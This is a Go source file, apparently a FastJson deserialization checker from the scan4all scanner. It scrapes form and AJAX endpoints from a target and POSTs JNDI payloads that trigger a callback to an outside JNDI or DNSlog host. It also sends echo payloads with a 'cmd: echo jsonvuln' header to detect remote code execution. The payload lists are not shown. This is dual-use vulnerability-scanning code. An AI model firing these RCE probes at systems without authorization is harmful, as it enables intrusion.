package fastjson

import (
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"github.com/GhostTroops/scan4all/pkg/jndi"
	"net/url"
	"regexp"
	"strings"
)

func Check(u string, finalURL string) string {
	domainx := getinputurl(finalURL)
	for _, jsonurl := range domainx {
		header := make(map[string]string)
		header["Content-Type"] = "application/json"
		randomstr := fmt.Sprintf("%x", jsonurl)
		if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
			for _, payload := range fastjsonJndiPayloads {
				var uri string
				if jndi.JndiAddress != "" {
					uri = jndi.JndiAddress + "/" + randomstr + "/"
				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
					uri = randomstr + "." + util.CeyeDomain
				}

				_, _ = util.HttpRequset(jsonurl, "POST", strings.Replace(payload, "dnslog-url", uri, -1), false, header)
			}
			if jndi.JndiAddress != "" {
				if jndi.Jndilogchek(randomstr) {
					util.SendLog(finalURL, "FastJson-JNDI", "Found Found vuln ", "")
					return "JNDI RCE"
				}
			}
			if util.CeyeApi != "" && util.CeyeDomain != "" {
				if util.Dnslogchek(randomstr) {
					util.SendLog(finalURL, "FastJson-JNDI", "Found Found vuln ", "")
					return "JNDI RCE"
				}
			}
		} else {
			header["cmd"] = "echo jsonvuln"
			for _, payload := range fastjsonEchoPayloads {
				if req, err := util.HttpRequset(jsonurl, "POST", payload, false, header); err == nil {
					if util.StrContains(req.Body, "jsonvuln") {
						util.SendLog(finalURL, "FastJson-ECHO", "Found Found vuln ", payload)
						return "ECHO RCE"
					}
				}
			}
		}
	}
	return ""
}

func getinputurl(domainurl string) (domainurlx []string) {
	req, err := util.HttpRequset(domainurl, "GET", "", true, nil)
	if err != nil {
		return nil
	}
	var loginurl []string
	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
	hreflist := hrefreg.FindStringSubmatch(req.Body)
	if hreflist != nil {
		req, err = util.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
		if err != nil {
			return nil
		}
	}
	domainreg := regexp.MustCompile(`<form.*?action="(.*?)"`)
	domainlist := domainreg.FindStringSubmatch(req.Body)
	if domainlist != nil {
		domainx := domainlist[len(domainlist)-1:][0]
		if util.StrContains(domainx, "http") {
			loginurl = append(loginurl, domainx)
		} else if domainx == "" {
			loginurl = loginurl
		} else if domainx[0:1] == "/" {
			u, _ := url.Parse(strings.TrimSpace(domainurl))
			loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
		} else {
			loginurl = append(loginurl, domainurl+"/"+domainx)
		}
	}
	domainreg2 := regexp.MustCompile(`ajax[\s\S]*?url.*?['|"](.*?)['|"]`)
	domainlist2 := domainreg2.FindAllStringSubmatch(req.Body, -1)
	if domainlist2 != nil {
		for _, a := range domainlist2 {
			domainx := a[1]
			if util.StrContains(domainx, "http") {
				loginurl = append(loginurl, domainx)
			} else if domainx == "" {
				loginurl = append(loginurl, domainurl)
			} else if domainx[0:1] == "/" {
				u, _ := url.Parse(strings.TrimSpace(domainurl))
				loginurl = append(loginurl, u.Scheme+"://"+u.Host+domainx)
			} else {
				loginurl = append(loginurl, domainurl+"/"+domainx)
			}
		}
	}
	return loginurl
}
